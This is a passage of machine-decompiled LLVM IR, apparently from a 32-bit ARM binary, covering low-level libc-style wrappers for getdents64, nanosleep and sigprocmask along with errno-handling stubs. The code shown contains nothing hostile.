  store i32 %v0_d344, i32* %r8.global-to-local, align 4
  store i32 %v0_d330, i32* %stack_var_-60, align 4
  store i32 %v2_d340, i32* %sl.global-to-local, align 4
  %v0_d350 = load i32, i32* @r0, align 4
  %v1_d354 = inttoptr i32 %v2_d340 to %linux_dirent64*
  store i32 %v2_d340, i32* %r1.global-to-local, align 4
  %v5_d358 = call i32 @getdents64(i32 %v0_d350, %linux_dirent64* %v1_d354, i32 %v0_d330)
  store i32 %v5_d358, i32* @r6, align 4
  %tmp = icmp ult i32 %v5_d358, -4095
  br i1 %tmp, label %dec_label_pc_d37c, label %dec_label_pc_d368

dec_label_pc_d368:                                ; preds = %dec_label_pc_d328
  %v0_d368 = call i32 @function_bdd4()
  %v0_d36c = load i32, i32* @r6, align 4
  %v1_d36c = sub i32 0, %v0_d36c
  store i32 %v1_d36c, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r6.global-to-local, align 4
  %v2_d374 = inttoptr i32 %v0_d368 to i32*
  store i32 %v1_d36c, i32* %v2_d374, align 4
  %v0_d384.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_d384

dec_label_pc_d37c:                                ; preds = %dec_label_pc_d328
  br i1 false, label %dec_label_pc_d384, label %dec_label_pc_d38c

dec_label_pc_d384:                                ; preds = %dec_label_pc_d37c, %dec_label_pc_d368
  %v0_d384 = phi i32 [ -1, %dec_label_pc_d37c ], [ %v0_d384.pre, %dec_label_pc_d368 ]
  store i32 %v0_d384, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_d480

dec_label_pc_d38c:                                ; preds = %dec_label_pc_d37c
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_d394 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_d394, i32* @r5, align 4
  %v0_d398 = load i32, i32* @sp, align 4
  store i32 %v0_d398, i32* @r4, align 4
  br label %dec_label_pc_d45c

dec_label_pc_d3a8:                                ; preds = %dec_label_pc_d45c
  %v2_d474 = add i32 %v3_d460, %v0_d474
  %v1_d3a8 = add i32 %v0_d3ac, 17
  %v2_d3a8 = inttoptr i32 %v1_d3a8 to i8*
  %v3_d3a8 = load i8, i8* %v2_d3a8, align 1
  %v4_d3a8 = zext i8 %v3_d3a8 to i32
  %v2_d3ac = inttoptr i32 %v1_d468 to i8*
  %v3_d3ac = load i8, i8* %v2_d3ac, align 1
  %v4_d3ac = zext i8 %v3_d3ac to i32
  %v4_d3b0 = mul nuw nsw i32 %v4_d3a8, 256
  %v5_d3b0 = or i32 %v4_d3ac, %v4_d3b0
  %v1_d3b4 = add nuw nsw i32 %v5_d3b0, 3
  %v1_d3b8 = and i32 %v1_d3b4, 131068
  store i32 %v1_d3b8, i32* %r3.global-to-local, align 4
  %v2_d3bc = add i32 %v1_d3b8, %v2_d3fc
  store i32 %v2_d3bc, i32* %sb.global-to-local, align 4
  %v9_d3c0 = icmp eq i32 %v2_d3bc, %v2_d474
  %v1_d3c4 = and i32 %v1_d3b4, 128
  %v2_d3c8 = icmp eq i32 %v1_d3c4, 0
  %v3_d3c8 = or i1 %v9_d3c0, %v2_d3c8
  br i1 %v3_d3c8, label %dec_label_pc_d3fc, label %dec_label_pc_d3cc

dec_label_pc_d3cc:                                ; preds = %dec_label_pc_d3a8
  store i32 %stack_var_-52.0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_d3dc = call i32 @function_d554(i32 %v0_d350, i32 %stack_var_-52.0, i32 %stack_var_-48.0, i32 0)
  %v0_d3e0 = load i32, i32* @r5, align 4
  %v1_d3e0 = load i32, i32* %r8.global-to-local, align 4
  %v9_d3e0 = icmp eq i32 %v0_d3e0, %v1_d3e0
  br i1 %v9_d3e0, label %dec_label_pc_d3e8, label %dec_label_pc_d47c

dec_label_pc_d3e8:                                ; preds = %dec_label_pc_d3cc
  %v0_d3e8 = call i32 @function_bdd4()
  store i32 22, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  %v2_d3f4 = inttoptr i32 %v0_d3e8 to i32*
  store i32 22, i32* %v2_d3f4, align 4
  %v0_d480.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_d480

dec_label_pc_d3fc:                                ; preds = %dec_label_pc_d3a8
  %v3_d3c411 = udiv i32 %v1_d3b4, 256
  %v1_d3fc = trunc i32 %v3_d3c411 to i8
  %v3_d3fc = add i32 %v2_d3fc, 17
  %v4_d3fc = inttoptr i32 %v3_d3fc to i8*
  store i8 %v1_d3fc, i8* %v4_d3fc, align 1
  %v0_d400 = load i32, i32* %r3.global-to-local, align 4
  %v1_d400 = trunc i32 %v0_d400 to i8
  %v2_d400 = load i32, i32* @r5, align 4
  %v3_d400 = add i32 %v2_d400, 16
  %v4_d400 = inttoptr i32 %v3_d400 to i8*
  store i8 %v1_d400, i8* %v4_d400, align 1
  %v0_d404 = load i32, i32* @r4, align 4
  %v1_d404 = add i32 %v0_d404, 8
  %v1_d408 = inttoptr i32 %v1_d404 to i32*
  %v2_d408 = load i32, i32* %v1_d408, align 4
  %v3_d408 = add i32 %v0_d404, 12
  %v4_d408 = inttoptr i32 %v3_d408 to i32*
  %v5_d408 = load i32, i32* %v4_d408, align 4
  store i32 %v5_d408, i32* %r3.global-to-local, align 4
  %v1_d414 = inttoptr i32 %v0_d404 to i32*
  %v2_d414 = load i32, i32* %v1_d414, align 4
  %v3_d414 = add i32 %v0_d404, 4
  %v4_d414 = inttoptr i32 %v3_d414 to i32*
  %v5_d414 = load i32, i32* %v4_d414, align 4
  store i32 %v5_d414, i32* %r3.global-to-local, align 4
  %v0_d418 = load i32, i32* @r5, align 4
  %v1_d418 = inttoptr i32 %v0_d418 to i32*
  store i32 %v2_d414, i32* %v1_d418, align 4
  %v3_d418 = add i32 %v0_d418, 4
  %v4_d418 = inttoptr i32 %v3_d418 to i32*
  %v5_d418 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v5_d418, i32* %v4_d418, align 4
  %v0_d41c = load i32, i32* @r4, align 4
  %v1_d41c = add i32 %v0_d41c, 8
  %v1_d420 = inttoptr i32 %v1_d41c to i32*
  %v2_d420 = load i32, i32* %v1_d420, align 4
  %v3_d420 = add i32 %v0_d41c, 12
  %v4_d420 = inttoptr i32 %v3_d420 to i32*
  %v5_d420 = load i32, i32* %v4_d420, align 4
  store i32 %v5_d420, i32* %r3.global-to-local, align 4
  %v1_d424 = load i32, i32* @r5, align 4
  %v2_d424 = add i32 %v1_d424, 8
  %v3_d424 = inttoptr i32 %v2_d424 to i32*
  store i32 %v2_d420, i32* %v3_d424, align 4
  %v0_d428 = load i32, i32* %r3.global-to-local, align 4
  %v1_d428 = load i32, i32* @r5, align 4
  %v2_d428 = add i32 %v1_d428, 12
  %v3_d428 = inttoptr i32 %v2_d428 to i32*
  store i32 %v0_d428, i32* %v3_d428, align 4
  %v0_d42c = load i32, i32* @r4, align 4
  %v1_d42c = add i32 %v0_d42c, 18
  %v2_d42c = inttoptr i32 %v1_d42c to i8*
  %v3_d42c = load i8, i8* %v2_d42c, align 1
  %v4_d42c = zext i8 %v3_d42c to i32
  store i32 %v4_d42c, i32* %r3.global-to-local, align 4
  %v2_d430 = load i32, i32* @r5, align 4
  %v3_d430 = add i32 %v2_d430, 18
  %v4_d430 = inttoptr i32 %v3_d430 to i8*
  store i8 %v3_d42c, i8* %v4_d430, align 1
  %v0_d434 = load i32, i32* @r4, align 4
  %v1_d434 = add i32 %v0_d434, 16
  %v2_d434 = inttoptr i32 %v1_d434 to i8*
  %v3_d434 = load i8, i8* %v2_d434, align 1
  %v4_d434 = zext i8 %v3_d434 to i32
  %v0_d438 = load i32, i32* %r7.global-to-local, align 4
  %v1_d438 = add i32 %v0_d438, 1
  %v2_d438 = inttoptr i32 %v1_d438 to i8*
  %v3_d438 = load i8, i8* %v2_d438, align 1
  %v4_d438 = zext i8 %v3_d438 to i32
  store i32 %v4_d438, i32* %r3.global-to-local, align 4
  %v4_d43c = mul nuw nsw i32 %v4_d438, 256
  %v5_d43c = or i32 %v4_d43c, %v4_d434
  %v1_d440 = add nsw i32 %v5_d43c, -19
  store i32 %v1_d440, i32* @r2, align 4
  %v3_d444 = call i32 @function_be20(i32 %v1_d46c, i32 %v1_d470, i32 %v1_d440)
  %v0_d448 = load i32, i32* @r4, align 4
  %v1_d448 = add i32 %v0_d448, 16
  %v2_d448 = inttoptr i32 %v1_d448 to i8*
  %v3_d448 = load i8, i8* %v2_d448, align 1
  %v4_d448 = zext i8 %v3_d448 to i32
  store i32 %v4_d448, i32* %r3.global-to-local, align 4
  %v0_d44c = load i32, i32* %r7.global-to-local, align 4
  %v1_d44c = add i32 %v0_d44c, 1
  %v2_d44c = inttoptr i32 %v1_d44c to i8*
  %v3_d44c = load i8, i8* %v2_d44c, align 1
  %v4_d44c = zext i8 %v3_d44c to i32
  %v4_d450 = mul nuw nsw i32 %v4_d44c, 256
  %v5_d450 = or i32 %v4_d450, %v4_d448
  store i32 %v5_d450, i32* %r3.global-to-local, align 4
  %v2_d454 = add i32 %v5_d450, %v0_d448
  store i32 %v2_d454, i32* @r4, align 4
  %v0_d458 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_d458, i32* @r5, align 4
  %v1_d45c.pre = load i32, i32* @r6, align 4
  %v0_d474.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_d45c

dec_label_pc_d45c:                                ; preds = %dec_label_pc_d38c, %dec_label_pc_d3fc
  %stack_var_-52.0 = phi i32 [ -1, %dec_label_pc_d38c ], [ %v2_d408, %dec_label_pc_d3fc ]
  %v0_d474 = phi i32 [ %v0_d394, %dec_label_pc_d38c ], [ %v0_d474.pre, %dec_label_pc_d3fc ]
  %v2_d3fc = phi i32 [ %v0_d394, %dec_label_pc_d38c ], [ %v0_d458, %dec_label_pc_d3fc ]
  %v0_d3ac = phi i32 [ %v0_d398, %dec_label_pc_d38c ], [ %v2_d454, %dec_label_pc_d3fc ]
  %v1_d45c = phi i32 [ %v5_d358, %dec_label_pc_d38c ], [ %v1_d45c.pre, %dec_label_pc_d3fc ]
  %stack_var_-48.0 = phi i32 [ -1, %dec_label_pc_d38c ], [ %v5_d408, %dec_label_pc_d3fc ]
  %v0_d45c = load i32, i32* %sl.global-to-local, align 4
  %v2_d45c = add i32 %v0_d45c, %v1_d45c
  store i32 %v2_d45c, i32* %r3.global-to-local, align 4
  %v3_d460 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_d460, i32* @r2, align 4
  %v3_d464 = icmp ult i32 %v0_d3ac, %v2_d45c
  %v1_d468 = add i32 %v0_d3ac, 16
  store i32 %v1_d468, i32* %r7.global-to-local, align 4
  %v1_d46c = add i32 %v2_d3fc, 19
  store i32 %v1_d46c, i32* @r0, align 4
  %v1_d470 = add i32 %v0_d3ac, 19
  store i32 %v1_d470, i32* @r1, align 4
  br i1 %v3_d464, label %dec_label_pc_d3a8, label %dec_label_pc_d47c

dec_label_pc_d47c:                                ; preds = %dec_label_pc_d45c, %dec_label_pc_d3cc
  %v1_d47c = phi i32 [ %v0_d3e0, %dec_label_pc_d3cc ], [ %v2_d3fc, %dec_label_pc_d45c ]
  %v0_d47c = phi i32 [ %v1_d3e0, %dec_label_pc_d3cc ], [ %v0_d474, %dec_label_pc_d45c ]
  %v2_d47c = sub i32 %v1_d47c, %v0_d47c
  store i32 %v2_d47c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_d480

dec_label_pc_d480:                                ; preds = %dec_label_pc_d3e8, %dec_label_pc_d384, %dec_label_pc_d47c
  %v0_d480 = phi i32 [ %v0_d480.pre, %dec_label_pc_d3e8 ], [ %v0_d384, %dec_label_pc_d384 ], [ %v2_d47c, %dec_label_pc_d47c ]
  store i32 %v3_d32c, i32* @r4, align 4
  store i32 %v9_d32c, i32* %r6.global-to-local, align 4
  ret i32 %v0_d480

; uselistorder directives
  uselistorder i32 %v1_d470, { 1, 0 }
  uselistorder i32 %v1_d46c, { 1, 0 }
  uselistorder i32 %v1_d468, { 1, 0 }
  uselistorder i32 %v3_d460, { 1, 0 }
  uselistorder i32 %v0_d3ac, { 2, 1, 3, 0 }
  uselistorder i32 %v2_d3fc, { 0, 3, 1, 2 }
  uselistorder i32 %v0_d404, { 1, 0, 2, 3 }
  uselistorder i32 %v0_d394, { 1, 0, 2 }
  uselistorder i32 %v5_d358, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 13, 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10, 12, 14, 15, 16 }
  uselistorder i32 (i32, i32, i32)* @function_be20, { 2, 1, 0, 3 }
  uselistorder i32 128, { 0, 1, 10, 2, 11, 3, 6, 4, 5, 7, 8, 9 }
  uselistorder i32* @r6, { 1, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 20, 0, 21, 3, 22, 23, 31, 32, 33, 24, 25, 26, 27, 28, 29, 30, 34, 35, 36, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 4, 49, 50, 51, 58, 59, 60, 61, 62, 63, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 52, 53, 2, 54, 55, 56, 57, 64, 65, 66, 67, 68, 69, 70, 71, 102, 103, 104, 105, 106, 107, 72, 73, 74, 75 }
  uselistorder label %dec_label_pc_d480, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d45c, { 1, 0 }
}

define i32 @function_d48c() local_unnamed_addr {
dec_label_pc_d48c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_d48c = load i32, i32* @r4, align 4
  store i32 %v3_d48c, i32* %stack_var_-8, align 4
  %v0_d494 = load i32, i32* @r0, align 4
  store i32 %v0_d494, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_d494, -4095
  br i1 %tmp, label %dec_label_pc_d4b0, label %dec_label_pc_d4a0

dec_label_pc_d4a0:                                ; preds = %dec_label_pc_d48c
  %v0_d4a0 = call i32 @function_bdd4()
  %v0_d4a4 = load i32, i32* %r4.global-to-local, align 4
  %v1_d4a4 = sub i32 0, %v0_d4a4
  %v2_d4a8 = inttoptr i32 %v0_d4a0 to i32*
  store i32 %v1_d4a4, i32* %v2_d4a8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_d4b4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_d4b0

dec_label_pc_d4b0:                                ; preds = %dec_label_pc_d48c, %dec_label_pc_d4a0
  %v2_d4b4 = phi i32 [ %v3_d48c, %dec_label_pc_d48c ], [ %v2_d4b4.pre, %dec_label_pc_d4a0 ]
  %v0_d4b0 = phi i32 [ %v0_d494, %dec_label_pc_d48c ], [ -1, %dec_label_pc_d4a0 ]
  store i32 %v2_d4b4, i32* @r4, align 4
  ret i32 %v0_d4b0

; uselistorder directives
  uselistorder i32 %v0_d494, { 1, 0, 2 }
  uselistorder label %dec_label_pc_d4b0, { 1, 0 }
}

define i32 @function_d4b8() local_unnamed_addr {
dec_label_pc_d4b8:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_d4b8 = load i32, i32* @r4, align 4
  store i32 %v3_d4b8, i32* %stack_var_-8, align 4
  %v0_d4c0 = load i32, i32* @r0, align 4
  store i32 %v0_d4c0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_d4c0, -4095
  br i1 %tmp, label %dec_label_pc_d4dc, label %dec_label_pc_d4cc

dec_label_pc_d4cc:                                ; preds = %dec_label_pc_d4b8
  %v0_d4cc = call i32 @function_bdd4()
  %v0_d4d0 = load i32, i32* %r4.global-to-local, align 4
  %v1_d4d0 = sub i32 0, %v0_d4d0
  %v2_d4d4 = inttoptr i32 %v0_d4cc to i32*
  store i32 %v1_d4d0, i32* %v2_d4d4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_d4e0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_d4dc

dec_label_pc_d4dc:                                ; preds = %dec_label_pc_d4b8, %dec_label_pc_d4cc
  %v2_d4e0 = phi i32 [ %v3_d4b8, %dec_label_pc_d4b8 ], [ %v2_d4e0.pre, %dec_label_pc_d4cc ]
  %v0_d4dc = phi i32 [ %v0_d4c0, %dec_label_pc_d4b8 ], [ -1, %dec_label_pc_d4cc ]
  store i32 %v2_d4e0, i32* @r4, align 4
  ret i32 %v0_d4dc

; uselistorder directives
  uselistorder i32 %v0_d4c0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_d4dc, { 1, 0 }
}

define i32 @function_d4e4(i32 %arg1) local_unnamed_addr {
dec_label_pc_d4e4:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_d4e4 = load i32, i32* @r4, align 4
  store i32 %v3_d4e4, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_d508, label %dec_label_pc_d4f8

dec_label_pc_d4f8:                                ; preds = %dec_label_pc_d4e4
  %v0_d4f8 = call i32 @function_bdd4()
  %v0_d4fc = load i32, i32* %r4.global-to-local, align 4
  %v1_d4fc = sub i32 0, %v0_d4fc
  %v2_d500 = inttoptr i32 %v0_d4f8 to i32*
  store i32 %v1_d4fc, i32* %v2_d500, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_d50c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_d508

dec_label_pc_d508:                                ; preds = %dec_label_pc_d4e4, %dec_label_pc_d4f8
  %v2_d50c = phi i32 [ %v3_d4e4, %dec_label_pc_d4e4 ], [ %v2_d50c.pre, %dec_label_pc_d4f8 ]
  %v0_d508 = phi i32 [ %arg1, %dec_label_pc_d4e4 ], [ -1, %dec_label_pc_d4f8 ]
  store i32 %v2_d50c, i32* %r4.global-to-local, align 4
  ret i32 %v0_d508

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_d508, { 1, 0 }
}

define i32 @function_d510() local_unnamed_addr {
dec_label_pc_d510:
  %v2_d514 = load i32, i32* @global_var_1747c.234, align 4
  %v2_d518 = icmp eq i32 %v2_d514, 0
  br i1 %v2_d518, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_d510
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_d510, %bb
  %v1_d520 = phi i32 [ %v2_d514, %dec_label_pc_d510 ], [ 4096, %bb ]
  ret i32 %v1_d520

; uselistorder directives
  uselistorder i32 4096, { 0, 1, 2, 6, 4, 3, 5, 7, 8 }
  uselistorder i32* @global_var_1747c.234, { 2, 1, 5, 0, 3, 4 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_d528() local_unnamed_addr {
dec_label_pc_d528:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_d528 = load i32, i32* @r4, align 4
  store i32 %v3_d528, i32* %stack_var_-8, align 4
  %v0_d530 = load i32, i32* @r0, align 4
  store i32 %v0_d530, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_d530, -4095
  br i1 %tmp, label %dec_label_pc_d54c, label %dec_label_pc_d53c

dec_label_pc_d53c:                                ; preds = %dec_label_pc_d528
  %v0_d53c = call i32 @function_bdd4()
  %v0_d540 = load i32, i32* %r4.global-to-local, align 4
  %v1_d540 = sub i32 0, %v0_d540
  %v2_d544 = inttoptr i32 %v0_d53c to i32*
  store i32 %v1_d540, i32* %v2_d544, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_d550.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_d54c

dec_label_pc_d54c:                                ; preds = %dec_label_pc_d528, %dec_label_pc_d53c
  %v2_d550 = phi i32 [ %v3_d528, %dec_label_pc_d528 ], [ %v2_d550.pre, %dec_label_pc_d53c ]
  %v0_d54c = phi i32 [ %v0_d530, %dec_label_pc_d528 ], [ -1, %dec_label_pc_d53c ]
  store i32 %v2_d550, i32* %r4.global-to-local, align 4
  ret i32 %v0_d54c

; uselistorder directives
  uselistorder i32 %v0_d530, { 1, 0, 2 }
  uselistorder label %dec_label_pc_d54c, { 1, 0 }
}

define i32 @function_d554(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_d554:
  %r4.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_d598, label %dec_label_pc_d584

dec_label_pc_d584:                                ; preds = %dec_label_pc_d554
  %v0_d584 = call i32 @function_bdd4()
  %v0_d588 = load i32, i32* %r4.global-to-local, align 4
  %v1_d588 = sub i32 0, %v0_d588
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_d590 = inttoptr i32 %v0_d584 to i32*
  store i32 %v1_d588, i32* %v2_d590, align 4
  %v0_d5a0.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_d5a0

dec_label_pc_d598:                                ; preds = %dec_label_pc_d554
  %v2_d598 = icmp eq i32 %arg1, 0
  br i1 %v2_d598, label %dec_label_pc_d5ac, label %dec_label_pc_d5a0

dec_label_pc_d5a0:                                ; preds = %dec_label_pc_d598, %dec_label_pc_d584
  %v0_d5a0 = phi i32 [ %arg1, %dec_label_pc_d598 ], [ %v0_d5a0.pre, %dec_label_pc_d584 ]
  br label %dec_label_pc_d5b0

dec_label_pc_d5ac:                                ; preds = %dec_label_pc_d598
  br label %dec_label_pc_d5b0

dec_label_pc_d5b0:                                ; preds = %dec_label_pc_d5a0, %dec_label_pc_d5ac
  %v14_d5b4 = phi i32 [ %v0_d5a0, %dec_label_pc_d5a0 ], [ %tmp9, %dec_label_pc_d5ac ]
  ret i32 %v14_d5b4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 3, 0, 2 }
  uselistorder label %dec_label_pc_d5b0, { 1, 0 }
}

define i32 @function_d5b8(%timespec* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_d5b8:
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to %timespec*
  %stack_var_-8 = alloca i32, align 4
  %v3_d5b8 = load i32, i32* @r4, align 4
  store i32 %v3_d5b8, i32* %stack_var_-8, align 4
  %v6_d5bc = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp)
  store i32 %v6_d5bc, i32* %r4.global-to-local, align 4
  %tmp6 = icmp ult i32 %v6_d5bc, -4095
  br i1 %tmp6, label %dec_label_pc_d5dc, label %dec_label_pc_d5cc

dec_label_pc_d5cc:                                ; preds = %dec_label_pc_d5b8
  %v0_d5cc = call i32 @function_bdd4()
  %v0_d5d0 = load i32, i32* %r4.global-to-local, align 4
  %v1_d5d0 = sub i32 0, %v0_d5d0
  %v2_d5d4 = inttoptr i32 %v0_d5cc to i32*
  store i32 %v1_d5d0, i32* %v2_d5d4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_d5dc

dec_label_pc_d5dc:                                ; preds = %dec_label_pc_d5b8, %dec_label_pc_d5cc
  %v0_d5dc = phi i32 [ %v6_d5bc, %dec_label_pc_d5b8 ], [ -1, %dec_label_pc_d5cc ]
  %v2_d5e0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_d5e0, i32* %r4.global-to-local, align 4
  ret i32 %v0_d5dc

; uselistorder directives
  uselistorder i32 %v6_d5bc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_d5dc, { 1, 0 }
}

define i32 @function_d5e4(i32 %arg1) local_unnamed_addr {
dec_label_pc_d5e4:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_d5e4 = load i32, i32* @r4, align 4
  store i32 %v3_d5e4, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i32* @global_var_17494.310 to i32), i32* %r4.global-to-local, align 4
  %v2_d5ec = load i32, i32* @global_var_17494.310, align 4
  %v2_d5f0 = icmp eq i32 %v2_d5ec, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_d5f0, label %dec_label_pc_d600, label %dec_label_pc_d60c

dec_label_pc_d600:                                ; preds = %dec_label_pc_d5e4
  %v2_d600 = call i32 @function_df6c(i32* null)
  %v1_d604 = icmp slt i32 %v2_d600, 0
  br i1 %v1_d604, label %dec_label_pc_d62c, label %dec_label_pc_d60cthread-pre-split

dec_label_pc_d60cthread-pre-split:                ; preds = %dec_label_pc_d600
  %v0_d610.pr = load i32, i32* %r5.global-to-local, align 4
  %v2_d60c.pre = load i32, i32* @global_var_17494.310, align 4
  br label %dec_label_pc_d60c

dec_label_pc_d60c:                                ; preds = %dec_label_pc_d60cthread-pre-split, %dec_label_pc_d5e4
  %v2_d60c = phi i32 [ %v2_d60c.pre, %dec_label_pc_d60cthread-pre-split ], [ %v2_d5ec, %dec_label_pc_d5e4 ]
  %v1_d618 = phi i32 [ %v0_d610.pr, %dec_label_pc_d60cthread-pre-split ], [ %arg1, %dec_label_pc_d5e4 ]
  %v2_d610 = icmp eq i32 %v1_d618, 0
  store i32 %v2_d60c, i32* %r4.global-to-local, align 4
  br i1 %v2_d610, label %dec_label_pc_d630, label %dec_label_pc_d620

dec_label_pc_d620:                                ; preds = %dec_label_pc_d60c
  %v2_d618 = add i32 %v1_d618, %v2_d60c
  %v1_d620 = inttoptr i32 %v2_d618 to i32*
  %v2_d620 = call i32 @function_df6c(i32* %v1_d620)
  %v1_d624 = icmp slt i32 %v2_d620, 0
  br i1 %v1_d624, label %dec_label_pc_d62c, label %dec_label_pc_d620.dec_label_pc_d630_crit_edge

dec_label_pc_d620.dec_label_pc_d630_crit_edge:    ; preds = %dec_label_pc_d620
  %v0_d630.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_d630

dec_label_pc_d62c:                                ; preds = %dec_label_pc_d620, %dec_label_pc_d600
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_d630

dec_label_pc_d630:                                ; preds = %dec_label_pc_d620.dec_label_pc_d630_crit_edge, %dec_label_pc_d60c, %dec_label_pc_d62c
  %v0_d630 = phi i32 [ %v0_d630.pre, %dec_label_pc_d620.dec_label_pc_d630_crit_edge ], [ %v2_d60c, %dec_label_pc_d60c ], [ -1, %dec_label_pc_d62c ]
  %v2_d634 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_d634, i32* @r4, align 4
  ret i32 %v0_d630

; uselistorder directives
  uselistorder i32 %v2_d60c, { 1, 0, 2 }
  uselistorder i32* null, { 0, 1, 4, 8, 9, 2, 3, 5, 6, 7 }
  uselistorder label %dec_label_pc_d630, { 2, 0, 1 }
}

define i32 @function_d63c(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_d63c:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_d63c = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v3_d63c, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_d63c
  %v3_d6445 = load i32, i32* @r4, align 4
  store i32 %v3_d6445, i32* %stack_var_-8, align 4
  br label %dec_label_pc_d664

bb:                                               ; preds = %dec_label_pc_d63c
  %v3_d644 = load i32, i32* @r4, align 4
  store i32 %v3_d644, i32* %stack_var_-8, align 4
  %tmp12 = icmp ult i32 %arg1, 3
  br i1 %tmp12, label %dec_label_pc_d664, label %dec_label_pc_d650

dec_label_pc_d650:                                ; preds = %bb
  %v0_d650 = call i32 @function_bdd4()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_d65c = inttoptr i32 %v0_d650 to i32*
  store i32 22, i32* %v2_d65c, align 4
  %v0_d688.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_d688

dec_label_pc_d664:                                ; preds = %.thread, %bb
  %v7_d664 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp)
  store i32 %v7_d664, i32* %r4.global-to-local, align 4
  %tmp13 = icmp ult i32 %v7_d664, -4095
  br i1 %tmp13, label %dec_label_pc_d684, label %dec_label_pc_d674

dec_label_pc_d674:                                ; preds = %dec_label_pc_d664
  %v0_d674 = call i32 @function_bdd4()
  %v0_d678 = load i32, i32* %r4.global-to-local, align 4
  %v1_d678 = sub i32 0, %v0_d678
  %v2_d67c = inttoptr i32 %v0_d674 to i32*
  store i32 %v1_d678, i32* %v2_d67c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_d684

dec_label_pc_d684:                                ; preds = %dec_label_pc_d664, %dec_label_pc_d674
  %v0_d684 = phi i32 [ %v7_d664, %dec_label_pc_d664 ], [ -1, %dec_label_pc_d674 ]
  store i32 %v0_d684, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_d688

dec_label_pc_d688:                                ; preds = %dec_label_pc_d650, %dec_label_pc_d684
  %v0_d688 = phi i32 [ %v0_d688.pre, %dec_label_pc_d650 ], [ %v0_d684, %dec_label_pc_d684 ]
  %v2_d68c = load i32, i32* %stack_var_-8, align 4
